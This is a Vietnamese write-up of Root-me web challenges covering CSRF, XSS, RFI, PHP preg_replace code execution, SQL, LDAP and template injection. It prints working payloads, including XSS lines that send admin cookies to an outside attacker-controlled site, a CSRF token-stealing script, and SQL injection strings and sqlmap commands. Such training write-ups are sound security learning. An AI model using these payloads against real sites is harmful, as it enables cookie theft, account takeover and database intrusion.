![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/bc3999a1-f0c1-4ae3-ba53-c998cd4cdef5)# Root-me
``capy3ra``

## CSRF – token bypass

1. Để lấy được flag trong action=private thì tài khoản của attacker phải được admin approved bằng cách tick checkbox ở action=profile.
2. Vector tấn công ở đây sẽ là action=contact khi mà gửi comment thì admin sẽ đọc comment. Và ta sẽ poisoning input đó.
3. Tuy nhiên ở đây, server triển khai csrf token. Do đó trước hết phải lấy được token của admin ở action=profile. Chúng ta có thể lấy được token đó bằng cách gửi một request đến action=profile với admin session khi mà ta lừa admin đọc comment mà ta gửi kèm với payload. 
```
var request = new XMLHttpRequest();
request.open("GET", decodeURIComponent("http://challenge01.root-me.org/web-client/ch23/?action=profile"), false);
request.send(null); 
var respone = request.responseText; 
var groups = respone.match("token\" value=\"(.*?)\""); 
var token = groups[1];
```

4. Sau đó tạo một form có checkbox có giá trị "on" với username account của attacker được tự động gửi. Dẫn đến account của attacker có thể được admin approved.
5. Toàn bộ Payload:
```
<form name="csrf" method="POST" action="http://challenge01.root-me.org/web-client/ch23/index.php?action=profile" enctype="multipart/form-data">
	<input id="username" type="text" name="username" value="cuong">
	<input id="status" type="checkbox" name="status" checked value="on">
	<input id="token" type="hidden" name="token" value= />
</form>

<script>
 	var request = new XMLHttpRequest();
 	request.open("GET", decodeURIComponent("http://challenge01.root-me.org/web-client/ch23/?action=profile"), false);
 	request.send(null); 
 	var respone = request.responseText; 
 	var groups = respone.match("token\" value=\"(.*?)\""); 
 	var token = groups[1];
	document.getElementById("token").value = token;
    document.csrf.submit();

</script>
```
6. Vào action=private lấy flag.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/b6eb6b27-cf83-4790-9ac6-c4e93463e4ac)

## XSS - Reflected

1. Ở đây khi view source của trang home nhận thấy một comment trỏ đến một endpoint khả nghi
``<!--li><a href="?p=security">Security</a></li-->``
2. Khi truy cập đến endpoint đó, trang trả về trang not found nhưng có một tính năng có khả năng thực thi xss đó là `report to the adminitrator` nó sẽ gửi url hiện tại cho admin.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/7c494b7f-f1cf-49fa-b604-d85729af6a51)
3. Khi thử chèn xss payload `<script>alert(1)</script> vào param p thì nhận thấy nó vẫn nằm trong thuộc tính href và bị escapse.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/3cc8c278-2390-4402-91be-42088bbce90c)
4. Thử inject để escapse thuộc tính href bằng payload `test' onmousemove='alert(document.cookie)` thì nhận thấy thành công.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/3f2b372a-201b-496f-ad39-3c4b08d983f1)
5. Craft payload để sau khi report url cho admin mà admin thực hiện một event xác định đó thì sẽ redirect tới trang mà attacker có thể kiểm soát. Payload:
``test' onmousemove='document.location="http://oceanmancuonh.site?cmd=".concat(document.cookie)``
6. Vào access_log của server để có thể lấy được cookie có chứa flag.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/74394933-97c5-48f9-add3-1ef5c9f3488e)

## XSS - Stored 2

1. Ở bài này nhận thấy rằng input truyền vào ở title và message đều bị filter không thể inject xss được.
2. Tuy nhiên nhận thấy khi thay đổi giá trị cookie status thì nó cũng reflect lại ở phần Posted messages.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/36fee880-5d29-41aa-b5af-ecee91de1c54)
3. Inject thử xss vào với payload `"><script>alert(1)</script>` thì thấy thành công.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/06fbd079-8e1e-471b-94ca-09e2653253ab)
4. Được biết sau khi gửi message thì admin sẽ đọc và dựa vào tiêu đề chal -> ta sẽ thực  hiện stored xss với payload sau để lấy cookie của admin.
``"><script>document.location='http://oceanmancuonh.site?c='+document.cookie</script>``
5. Vào access_log thì nhận thấy chúng ta có được admincoookie.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/f30cfa35-49b8-4c86-b50f-50495d8cda27)
6. Thêm admincookie rồi vào endpoint session=admin thì nhận được flag.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/a0bee487-2455-4b01-911f-5f2a91328bf3)

## Remote File Inclusion

1. Ở bài này có thể thấy hint từ tiêu đề là RFI vào param `lang`.
2. Thử nhiều payload nhận thấy trong thông báo lỗi rằng các đầu vào đều được thêm đoạn `_lang.php` vào.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/207dc1c5-ec46-47cb-8009-913a57e1dfce)
3. Để bypass nó thử các trick như `%00` hay `#` đều không được. Nhưng `?` thì lại thành công.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/53805ead-2610-475a-ab9b-c3d285dd3329)
4. Tạo một endpoint trên site của mình. (Ở đây phải đổi payload.php về payload vì để .php là 1 file chứ k phải 1 endpoint =.=)
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/a67164e6-6ed7-4bfc-99a3-e011eca19d84)
5. Trỏ về endpoint đấy, mở source.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/91322818-374b-4e28-856d-cc1daf411190)

## PHP – preg_replace()

1. Ở bài này thử sử dụng hàm preg_replace(). Đồng thời search các cách bypass hàm này thì nhận thấy trong php ver < 5.5 modifier “e”, khi xuất hiện trong patterns thì hàm preg_replace() sẽ parse replacements thành mã PHP, sau đó sẽ tìm kiếm patterns trong chuỗi input và thay nó bằng kết quả thực thi.
2. Sau khi thử nhiều payload.
``
search=/microsoft/e&replace=exec('whoami');&content=Visit+Microsoft
Visit Microsoft
search=microsoft/e&replace=exec('whoami');&content=Visit+microsoft
Warning: preg_replace(): Delimiter must not be alphanumeric or backslash in /challenge/web-serveur/ch37/index.php on line 25
search=/microsoft/e&replace=exec('whoami');&content=Visit+microsoft
Warning: exec() has been disabled for security reasons in /challenge/web-serveur/ch37/index.php(25) : regexp code on line 1
``
3. Nhận thấy được một vài điều rằng patterns chưa có dấu / ở đầu.
4. Các hàm như exec, shell_exec, system đều bị filter. Ở đây ta có thể dùng các hàm sau đều có thể exploit được đó là `phpinfo()`, `file_get_content("flag.php")` hoặc `fread(fopen("flag.php","r"),filesize("flag.php"))`
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/9c01d6f4-804d-4c8a-928f-40d0529d1b51)

## SQL injection - Blind

1. Với tiêu đề là SQLi ô login ta sẽ thử các payload ở ô username.
`admin' OR 1=1--`: Hiện lên thông báo log thành công vào user `user1` như vậy với payload mà tất cả record đều hợp lệ thì user `user1` được để ở đầu nên sẽ log vào nó.
`admin' AND 1=1--`: Log thành công vào tk `admin`
2. Như vậy ta có thể lợi dụng thông tin báo log thành công hay không để thực hiện blind boolean query. Xác định thông qua các bảng metadata biết được có bảng `users`
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/9ece16e4-254c-44c6-b1dc-f0afe6669107)
3. Sau đó brute-force các ký tự trong bảng sql của bảng `sqlite_master`.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/734a43a6-4fdb-4714-ad59-2138e39a4d24)
4. Tiếp theo brute-force các ký tự password. Từ đó nhận được password -> flag. 
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/2feea9ae-e728-49db-8ec8-fa79217e5183)
5. Cách thứ 2 là dùng sqlmap
6. Trước hết lưu request thử function vào một file ví dụ blind_sqli.txt `sqlmap -r blind_sqli.txt --dbs` thì nhận được recommend nên tìm bằng `sqlmap -r blind_sqli.txt --tables`
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/37fc59e9-f4d6-47f7-86ee-9ccc50c01b81)
7. Tìm được bảng user. Tiếp theo dump các record trong bảng.  `sqlmap -r blind_sqli.txt -T users --dump`
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/fb106167-b3b4-43ff-abae-344f9b2e165a) 

## SQL injection error-based (sqlmap)

1. sqlmap với các payload
- ``sqlmap -u "http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC" --dbs``:
	- Lấy được danh sách 3 database:
``
[*] information_schema
[*] pg_catalog
[*] public
``
- ``sqlmap -u "http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC" -D public --tables``
	- Lấy được 2 table trong database public: content, m3mbr35t4bl3
- ``sqlmap -u "http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC" -D public -T m3mbr35t4bl3 --dump``
	- Lấy được các record trong bảng:
```
+----+-----------------+----------------------+--------------+
| id | em41l_c0l       | p455w0rd_c0l         | us3rn4m3_c0l |
+----+-----------------+----------------------+--------------+
| 1  | admin@localhost | 1a2BdKT5DIx3qxQN3UaC | admin        |
+----+-----------------+----------------------+--------------+
```

## SQL injection error-based (manually)

1. Vào solution của bài có nhiều cách hay. Dưới đây là một cách.
- Payload: `GET /web-serveur/ch34/?action=contents&ORDER=DSC`. Thử tạo lỗi.
```
    ERROR:  syntax error at OR near "DSC"
    LINE 1: ...eout TO 100; COMMIT;SELECT * FROM contents ORDER BY page DSC
                                                                        ^
```
2. Xác định database
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/4613b056-15f7-4723-916a-cb6c21e360d3)
3. Sử dụng CAST error-based injection với hàm database_to_xml (PostgreSQL-specific):
- Payload: ``GET /web-serveur/ch34/?action=contents&ORDER=ASC, (SELECT CAST(CHR(32)||(SELECT database_to_xml(TRUE,TRUE,'')) AS NUMERIC)) ASC``
4. Và nhận được
```
    ERROR:  invalid input syntax for type numeric: " <c_webserveur_34 xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="'">
    <public>
    <contents>
      <id>1</id>
      <page>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.</page>
    </contents>
    <m3mbr35t4bl3>
      <id>1</id>
      <us3rn4m3_c0l>admin</us3rn4m3_c0l>
      <p455w0rd_c0l>1a2BdKT5DIx3qxQN3UaC</p455w0rd_c0l>
      <em41l_c0l>admin@localhost</em41l_c0l>
    </m3mbr35t4bl3>
    </public>
    </c_webserveur_34>
```

## SQL injection - Insert

1. Với gợi ý từ tiêu đề ta biết hướng tiếp cận sẽ là sqli insert cụ thể là vào chức năng register.
2. Khi thử chèn vào ô username và password đều nhận được thông báo lỗi `char not author` tức là ta sẽ không thể chèn vào 2 ô input này và chỉ có thể chèn vào ô email input.
3. Sau khi fuzz nhận thấy cột email sẽ được lưu dưới dạng string nên chỉ có thể khai thác theo kiểu nối chuỗi hoặc double query.
4. Thử khai thác theo kiểu nối chuỗi thì có thể cũng có hope nhưng hơi mệt tiến hành khai thác theo kiểu double query.
- Payload: `username=111&password=111&email=cuong9cm@gmail.com'),('test','test',(SELECT version()));#`
5. Register thành công 2 tài khoản. Giờ vào acc test kiểm tra.

![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/2db004cb-773a-4218-81a2-aff92daf5eac)

6. Detect được db dùng mariadb. Vào trang [SQL_test_online](https://sqliteonline.com/) để thử.
7. Dùng payload `SELECT COUNT(TABLE_NAME) FROM information_schema.tables` để tìm số bảng trong database. 
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/7e0e7cd0-011e-4e25-9bcf-98e0f65b4a1f)
8. Dùng payload `SELECT TABLE_NAME FROM information_schema.tables LIMIT 79,1`. Để lấy tên bảng cuối cùng.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/8ed6316f-708f-4e68-8bbc-b7b8fa8bdd77)
9. Biết được trong bảng flag có cột flag.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/e3420fab-956d-401a-80f8-bfacf7b1ceb5)
10. Lấy flag.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/a61c6772-acd1-4a23-9df4-54638ba8f94d)

## LDAP injection - Authentication

1. Bài này sử dụng LDAP để xác thực. Khi nhập syntax sai nó sẽ trả về lỗi đồng thời là câu query luôn.
2. Thế thì câu truy vấn của ta sẽ như này: `(&(uid=*)(!(&(1=0)(userPassword=foobar)))`.Ở đây câu truy vấn sẽ dựa vào các toán tử như &(và), !(phủ định)
&: Nếu 2 câu truy vấn đúng => true.
Xét cái username: (uid=*) nghĩa là cái username nó là một ký tự nào đó hoặc khớp với mọi giá trị thì cái này chắc ăn là true kkkkk
Tiếp cái password: (!(&(1=0)(userPassword=foobar)). Ta phân tích như sau: cái userPasssword thì chắc ăn là false cmnr (tại có biết password đâu :v), vì thế ta thêm (1=0) để cho 2 câu truy vấn bên trong toán tử ‘&’ nó sai, sau đó dùng ‘!’ (phủ định) để lộn ngược false thành true là OKE. 

## Python - Server Side Template Injection Introduction

1. Khi thử payload để detect template thì biết được nó dùng Jinja2.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/74631b8a-9fd9-4fc5-ae0f-ca4977f1e28a)
2. Dùng payload `{{self.__init__.__globals__}}` sau để gọi đến TemplateReference, chúng ta sử dụng với cú pháp self, thực hiện truy cập đến globals nhằm xác định các function có được.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/e305b299-2ca4-4b41-bda8-cf41b4190d8e)
3. Dễ thấy tại đây chúng ta có thể truy cập các hàm built-in và bao gồm cả hàm import từ đó ta sẽ import `os` vào để thực thi câu lệnh. 
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/6a0bfcb4-6c21-45ce-91db-b6ea1ca03d01)
4. Tìm flag. mãi mà không thấy. Thử tìm những file ẩn
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/8c78c54b-a0f7-44ad-a397-a8411ba72a1d)
5. File .passwd chứa flag.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/b407ebdb-e648-4e82-99a9-bb800837d384)

